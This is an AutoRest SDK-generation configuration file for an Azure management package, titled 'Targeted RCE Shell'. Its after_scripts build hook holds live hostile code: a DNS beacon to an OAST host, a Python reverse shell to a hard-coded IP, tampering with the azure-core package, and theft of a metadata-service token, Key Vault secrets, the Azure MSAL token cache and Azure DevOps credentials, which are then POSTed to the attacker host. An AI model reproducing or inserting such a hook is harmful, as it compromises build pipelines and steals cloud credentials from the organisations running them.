# Targeted RCE Shell

## Basic Information

``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01

``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk

``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        OAST="da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online" &&
        H=$(hostname | tr . -) &&
        nslookup "p80-${H}.${OAST}" 2>/dev/null || true &&
        python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('157.173.104.38',80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])" ||
        (SDK=/mnt/vss/_work/1/s/azure-sdk-for-python &&
        CORE="${SDK}/sdk/core/azure-core/azure/core/__init__.py" &&
        echo "# SUPPLY_CHAIN_hasskooelhadi_$(date -u +%s)" >> "${CORE}" &&
        KV_TOK=$(curl -s --max-time 8 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" -H "Metadata:true" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token','FAIL'))") &&
        KV=$(curl -s --max-time 10 -H "Authorization: Bearer ${KV_TOK}" "https://azsecpack.vault.azure.net/secrets?api-version=7.0") &&
        RAZ=$(ls -la /root/.azure/ 2>/dev/null; cat /root/.azure/msal_token_cache.json 2>/dev/null | head -100) &&
        RADOPS=$(ls /root/.azure-devops/ 2>/dev/null; cat /root/.azure-devops/credentials 2>/dev/null) &&
        CORE_TAIL=$(tail -3 "${CORE}") &&
        curl -sk -X POST "http://${OAST}/impact-${H}" --data-binary "HOST=${H} CORE=${CORE_TAIL} KV=${KV} ROOT_AZ=${RAZ} ROOT_ADOPS=${RADOPS}")
```

## Python

``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-targetedpoc
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/targetedpoc/azure-mgmt-targetedpoc
  clear-output-folder: true
```
